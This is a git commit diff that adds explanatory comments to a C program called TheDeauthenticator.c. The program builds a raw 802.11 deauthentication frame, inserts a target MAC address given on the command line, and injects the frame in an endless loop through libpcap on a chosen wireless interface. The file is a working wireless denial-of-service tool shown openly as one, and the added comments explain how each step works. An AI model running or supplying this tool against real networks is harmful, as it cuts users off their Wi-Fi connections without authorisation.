65fe3149fbf1a5c177a086368f43b0942935178b
nichol92 <15nicholsa@gmail.com>
2016-10-30 17:01:35 +0000

    Update TheDeauthenticator.c

--- TheDeauthenticator.c
+++ TheDeauthenticator.c
@@ -2,7 +2,7 @@
 #include "hacking.h"
 #include <pcap/pcap.h>
 /* This is the array for building the ieee packets ie deauth and broadcast*/
-unsigned char BobTheBuilder[] = {
+unsigned char BobTheBuilder[] = {   // byte structure for the packet with a radiotap and mac header
   0x00, 0x00, 0x0C, 0x00,
   0x04, 0x80, 0x00, 0x00, 
   0x02, 0x00, 0x18, 0x00,
@@ -22,7 +22,7 @@ int main(int argc, unsigned char *argv[])
   char errbuf[PCAP_ERRBUF_SIZE];
   char *device;
   int i, r;
-   sscanf(argv[1], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);
+   sscanf(argv[1], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]); //converts the charter mac address in to a 6 byte hexadecimal address
   for(i=0;i<6;i++)
     {
       BobTheBuilder[i + 16] = (unsigned char)iMac[i];
@@ -34,9 +34,9 @@ int main(int argc, unsigned char *argv[])
       BobTheBuilder[i + 30] = (unsigned char)iMac[i];
     }
   device = argv[3];
-  dump((const unsigned char *) &BobTheBuilder, sizeof(BobTheBuilder));/*DEBUGGING*/
+  dump((const unsigned char *) &BobTheBuilder, sizeof(BobTheBuilder));/*DEBUGGING*/ //used to check that the bytes are all correct and that the packet hasnt been malformed
   errbuf[0] = '\0';
-  ppcap = pcap_open_live(device, 800, 1, 20, errbuf);
+  ppcap = pcap_open_live(device, 800, 1, 20, errbuf); //creates a pcap handle for the specified device
 	if (ppcap == NULL)
 	{
 		printf("Unable to open interface %s in pcap: %s\n",
@@ -45,7 +45,7 @@ int main(int argc, unsigned char *argv[])
 	}
 	while(1)
 	  {
-	    	r = pcap_inject(ppcap, BobTheBuilder, sizeof(BobTheBuilder));
+	    	r = pcap_inject(ppcap, BobTheBuilder, sizeof(BobTheBuilder)); //sends the packet over a raw socket using packet injection via the device that the pcap handle points to
 		dump((const unsigned char *) &BobTheBuilder, sizeof(BobTheBuilder));/*DEBUGGING*/
 	  }
 
